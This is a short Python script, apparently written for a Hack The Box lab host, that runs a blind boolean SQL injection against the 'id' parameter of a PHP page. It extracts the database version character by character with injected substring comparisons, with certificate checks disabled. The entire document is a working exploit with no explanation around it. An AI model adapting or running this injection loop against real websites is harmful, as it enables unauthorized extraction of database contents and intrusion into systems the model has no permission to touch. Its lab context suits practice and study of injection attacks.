#!/usr/bin/env python3

import requests
import string
import sys
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

i = 1
while True:
    done = True
    for c in string.printable[:-10]:
        param = {"id": f"587' and substring(@@version,{i},1)='{c}'-- -"}
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        resp = requests.get("https://www.nestedflanders.htb/index.php", params=param, verify=False, proxies=False)
        if not "2001" in resp.text:
            sys.stdout.write(c)
            sys.stdout.flush()
            i += 1
            done = False
            break
    if done:
        break